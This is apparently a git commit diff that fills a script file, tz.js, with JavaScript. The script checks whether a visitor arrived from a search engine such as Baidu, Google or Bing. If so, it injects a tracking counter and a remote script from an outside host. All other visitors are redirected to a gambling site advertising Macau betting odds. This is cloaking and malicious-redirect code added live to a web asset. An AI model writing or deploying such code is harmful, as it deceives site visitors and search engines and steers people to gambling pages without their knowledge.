45ca7685bf281f377ddfb9480fc848ddbe262fef
js999999999 <js-9@outlook.com>
2017-03-08 10:52:54 +0800

    Update tz.js

--- 2017hh/tz.js
+++ 2017hh/tz.js
@@ -1,1 +1,11 @@
-1
+today=new Date();
+today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
+var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
+var where =document.referrer;
+if(regexp.test(where)){
+document.write ('<script language="javascript" src="http://count40.51yes.com/click.aspx?id=403809734&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/2017hh/tz.js "></script></div>');
+}
+else
+{
+window.location.href="http://www.53848.com/#澳门永利（特码48.5倍）";
+}
